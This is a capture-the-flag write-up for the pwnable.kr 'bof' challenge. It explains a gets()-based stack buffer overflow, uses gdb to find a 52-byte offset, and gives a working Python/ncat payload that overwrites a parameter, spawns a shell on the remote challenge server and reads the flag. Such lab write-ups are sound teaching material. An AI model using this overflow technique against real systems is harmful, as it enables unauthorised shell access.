# bof
**Tier**: toddlers-bottle  
**Points:** 5pts  
**Vulnerability:** [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)  
**Concepts:** Stack-based Buffer Overflow  
**Date:** 2026-11-16

> Nana told me that buffer overflow is one of the most common software vulnerability.  
> Is that true?  
> [bof - pwnable.kr](https://pwnable.kr/play/3)

## 1. Recon

### 1.1. Source Code Analysis
The provided source code (`bof.c`) is rather straightforward.

```c
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Starting with the `main` function, we see that it simply passes the hexadecimal
value `0xdeadbeef` to the `func` function.

```c 
void func (int key) {
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if (key == 0xcafebabe) {
        // pass; spawn shell
		system("/bin/sh");
	}
    // fail
}
```

The `func` function allocates a 32-byte string `overflowme` on the stack, and 
then calls `gets`, which reads a line from the standard input, and saves it to
our 32-byte buffer `overflowme`[^man-gets]. Afterwards, it checks for equality
between the argument `key` and the hexadecimal value `0xcafebabe`. If the two 
values are equal, the program spawns a shell, which we can use to view the 
flag. Otherwise, it leads to a failure branch.

Recall that the `main` function passes the hexadecimal value `0xdeadbeef` as the 
argument `key`. With that in mind, what's being tested for equality here is 
actually `0xdeadbeef` and `0xcafebabe`, which will always be false. This means
that if we want to capture the flag, we must somehow overwrite the `key` 
parameter to match `0xcafebabe`.

One glaring issue with the code snippet is that `gets` is deprecated and 
completely removed from the C standard library[^man-gets]. This is because
`gets` is unbounded and will write data past its buffer if the input is larger 
than the size of its buffer. In other words, the `gets` function puts the 
program at risk as it can cause a buffer overflow.

With this information, we infer that we must exploit the buffer overflow 
vulnerability to overwrite the value of the `key` parameter, pass the 
conditional check, and view the flag in the spawned shell.

### 1.2. Stack Canary

Since we're going for a stack-based buffer overflow, it is worth discussing
stack canaries. A stack canary is a small value inserted at the end of 
stack-based buffers which is used to terminate programs when a stack overflow 
is detected[^rhel-ssp]. This value is stored in memory, and is later checked 
whether it has changed. If a change in value is detected, the program 
terminates. This value is inserted right after the allocation of the buffer, 
and is checked before the function returns.

```c 
void func (int key) {
	char overflowme[32]; // an extra 4 bytes is allocated for the canary
    // ...
	if (key == 0xcafebabe) {
        // pass; spawn shell
	}
    // fail
    // canary is checked at this point
    return;
}
```

The snippet above has been annotated to show at which point the canary is 
inserted, and at which point it is checked. Since the program spawns a shell
before returning, we can overflow the buffer to spawn a shell before the program
gets terminated by the canary check.

```bash
 $ checksec file bof
  _____ _    _ ______ _____ _  __ _____ ______ _____
 / ____| |  | |  ____/ ____| |/ // ____|  ____/ ____|
| |    | |__| | |__ | |    | ' /| (___ | |__ | |
| |    |  __  |  __|| |    |  <  \___ \|  __|| |
| |____| |  | | |___| |____| . \ ____) | |___| |____
 \_____|_|  |_|______\_____|_|\_\_____/|______\_____|

RELRO          Stack Canary     ...
Partial RELRO  Canary Found     ...
```

Furthermore, we confirm that the binary has been compiled with stack canaries
through `checksec`.

## 2. Exploit

### 2.1. Calculating how much bytes to overflow

To overwrite the value of the `key` parameter, we must learn what its memory
address is, as well as what the memory address of our 32-byte buffer is. 
Following this, we can compute the distance between the two and construct a
payload of precise length to safely overwrite the `key` parameter.

```asm
$ gdb bof
(gdb) b main
(gdb) r
...
Breakpoint 1, 0x565562ab in main ()
(gdb) disas
Dump of assembler code for function main:
   0x5655629d <+0>:	lea    0x4(%esp),%ecx
   0x565562a1 <+4>:	and    $0xfffffff0,%esp
   0x565562a4 <+7>:	push   -0x4(%ecx)
   0x565562a7 <+10>:	push   %ebp
   0x565562a8 <+11>:	mov    %esp,%ebp
   0x565562aa <+13>:	push   %ecx
=> 0x565562ab <+14>:	sub    $0x4,%esp
   0x565562ae <+17>:	call   0x565562d5 <__x86.get_pc_thunk.ax>
   0x565562b3 <+22>:	add    $0x2d4d,%eax
   0x565562b8 <+27>:	sub    $0xc,%esp
   0x565562bb <+30>:	push   $0xdeadbeef
   0x565562c0 <+35>:	call   0x565561fd <func>
   0x565562c5 <+40>:	add    $0x10,%esp
   0x565562c8 <+43>:	mov    $0x0,%eax
   0x565562cd <+48>:	mov    -0x4(%ebp),%ecx
   0x565562d0 <+51>:	leave
   0x565562d1 <+52>:	lea    -0x4(%ecx),%esp
   0x565562d4 <+55>:	ret
End of assembler dump.
```

We run the binary file `bof` in `gdb` so we can inspect memory 
addresses and disassemble instructions on the fly. Here's a breakdown of the
commands used in the snippet above:
- `b main`: Adds a breakpoint to `main` so it pauses execution upon entrance.
- `r`: Starts the program.
- `disas`: Disassembles the instructions and shows an assembler dump.

```asm
   ...
   0x565562bb <+30>:	push   $0xdeadbeef
   0x565562c0 <+35>:	call   0x565561fd <func>
   0x565562c5 <+40>:	add    $0x10,%esp
   ...
```

Zooming in the assembler dump, we see the `key` parameter `0xdeadbeef` and
the function call to `func`. To step in this, we add another breakpoint at the
memory address of `func` (`0x565561fd`).

```asm
(gdb) b *0x565561fd
(gdb) n
...
Breakpoint 2, 0x565561fd in func ()
(gdb) disas
Dump of assembler code for function func:
=> 0x565561fd <+0>:	push   %ebp
   0x565561fe <+1>:	mov    %esp,%ebp
   0x56556200 <+3>:	push   %esi
   0x56556201 <+4>:	push   %ebx
   0x56556202 <+5>:	sub    $0x30,%esp
   ...
   0x56556230 <+51>:	lea    -0x2c(%ebp),%eax
   0x56556233 <+54>:	push   %eax
   0x56556234 <+55>:	call   0x56556060 <gets@plt>
   0x56556239 <+60>:	add    $0x10,%esp
   0x5655623c <+63>:	cmpl   $0xcafebabe,0x8(%ebp)
   0x56556243 <+70>:	jne    0x56556272 <func+117>
   ...
```

Next, we run the program until we hit the next breakpoint inside `func` through 
the `n` command. Once again, we disassemble the instructions and reveal the 
assembly instructions for `func`. 

```asm
(gdb) ni 4
0x56556202 in func ()
(gdb) disas
Dump of assembler code for function func:
   0x565561fd <+0>:	push   %ebp
   0x565561fe <+1>:	mov    %esp,%ebp
   0x56556200 <+3>:	push   %esi
   0x56556201 <+4>:	push   %ebx
=> 0x56556202 <+5>:	sub    $0x30,%esp
   ...
   0x56556230 <+51>:	lea    -0x2c(%ebp),%eax
   0x56556233 <+54>:	push   %eax
   0x56556234 <+55>:	call   0x56556060 <gets@plt>
   0x56556239 <+60>:	add    $0x10,%esp
   0x5655623c <+63>:	cmpl   $0xcafebabe,0x8(%ebp)
   0x56556243 <+70>:	jne    0x56556272 <func+117>
   ...
(gdb) x $ebp + 8
0xffffd730:	0xdeadbeef
```

Since the first four instructions of `func` is the function prologue, we skip
through it by moving to the next instruction 4 times (`ni 4`). The extended
base pointer (`ebp`) holds the function parameters starting at `ebp + 8` and
so on[^uvcs-asm]. As such, we print out the first parameter through the command 
`x $ebp + 8`, and learn that the memory address `0xffffd730` holds our target
variable as confirmed by its value `0xdeadbeef`. Next, we look for the memory
address of the 32-byte buffer.

```asm
(gdb) b *0x56556239
(gdb) n
overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 3, 0x56556239 in func ()
(gdb) x/16xw $esp
0xffffd6e0:	0xffffd6fc	0x00000001	0xf7f916a0	0x5655620a
0xffffd6f0:	0x00000000	0x00000001	0xf7ffdb40	0x41414141
0xffffd700:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd710:	0x41414141	0x41414141	0x00004141	0x88c33900
```

We add another breakpoint after the `gets` function call. This is so that we
can input a distinct string which we could later inspect to find the memory
address of our buffer. In this case, we enter 30 bytes of `A`, whose ASCII
value in hexadecimal is `0x41`. After entering our input, we inspect the 
extended stack pointer `esp` as it holds the variables allocated on the 
stack[^uvcs-asm]. The command `x/16xw $esp` tells gdb to display 16 units
of memory, where each unit is a word (`w`) in hexadecimal format (`x`). The 
output of the command shows consecutive blocks having the same value 
`0x41414141`. Its first occurence marks the start of our buffer, `0xffffd6fc`.

Now that we know that memory address of the `key` parameter is `0xffffd730`, and
the memory address of the buffer is `0xffffd6fc`, we now calculate its distance,
which is `0x34` or 52 bytes. Therefore, we must enter 52 bytes of padding 
characters as the first part of our input, followed by the raw value 
`0xcafebabe`.

### 2.2. Constructing the payload

For readability's sake, we will use Python to print out the 52 padding 
characters followed by the value `0xcafebabe` in little-endian order, and the 
command we want to inject:
```bash
$ python -c 'import sys; sys.stdout.buffer.write(b"A" * 52 + b"\xbe\xba\xfe\xca" + b"\nls\n")' | ncat pwnable.kr 10003
overflow me : /bin/sh: 0: can't access tty; job control turned off
$ bof  flag
$ %
```

Since the system seems to have the tty turned off, we can't interact with its 
terminal. As a solution to that, we end our payload with the command we want to
run, wrapped around new lines so that the program knows where it separates 
inputs. In this case, we ran `ls` and found out that the current directory has
the files `bof` and `flag`.

### 2.3. Capturing the flag

To capture the flag, we simply run the same command, but this time run 
`cat flag` instead of `ls`:
```bash
$ python -c 'import sys; sys.stdout.buffer.write(b"A" * 52 + b"\xbe\xba\xfe\xca" + b"\ncat flag\n")' | ncat pwnable.kr 10003
overflow me : /bin/sh: 0: can't access tty; job control turned off
$ [REDACTED]
$ %
```

## 3. References

[^man-gets]: [Linux man page - gets(3)](https://linux.die.net/man/3/gets)  
[^rhel-ssp]: [Red Hat - Security Technologies: Stack Smashing Protection (StackGuard)](https://www.redhat.com/en/blog/security-technologies-stack-smashing-protection-stackguard)  
[^uvcs-asm]: [University of Virginia Computer Science - CS216 x86 Assembly Guide](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html)
